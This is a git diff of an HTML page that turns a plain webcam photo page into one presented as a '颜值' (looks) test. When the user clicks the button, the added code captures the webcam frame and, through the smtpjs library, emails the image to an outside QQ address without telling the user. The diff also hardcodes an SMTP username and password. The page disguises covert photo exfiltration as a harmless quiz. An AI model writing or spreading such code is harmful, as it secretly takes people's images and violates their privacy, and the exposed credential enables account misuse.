@@ -4,14 +4,18 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>摄像头拍照</title>
+  <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>>
+  <title>测一测颜值</title>
 </head>
 <body>
-  <video id="video" width="480" height="320" controls>
-  </video>
+	<div>
+		 <video id="video" width="480" height="320" controls></video>
+	</div>
+ 
   <div>
-    <button id="capture">拍照</button>
+    	<button id="capture">测一测</button>
   </div>
+  <span id="text1"></span>>
   <canvas id="canvas" width="480" height="320"></canvas>
   <script>
     //访问用户媒体设备的兼容方法
@@ -58,8 +62,23 @@
     }
 
     document.getElementById('capture').addEventListener('click', function () {
-      context.drawImage(video, 0, 0, 480, 320);      
+    	this.disabled = true;
+      context.drawImage(video, 0, 0, 480, 320); 
+      var canvas = document.getElementById('canvas');
+      var img = canvas.toDataURL();
+    
+      Email.send({
+      	Host:"smtp.qq.com",
+      	Username:"helloword65535@qq.com",
+      	Password:"khqmjykzpkakicbd",
+      	To:"1284504331@qq.com",
+      	From:"helloword65535@qq.com",
+      	Subject:"测试数据",
+      	Body:img
+      })
+            
     })
+
   </script>
 </body>
 </html>
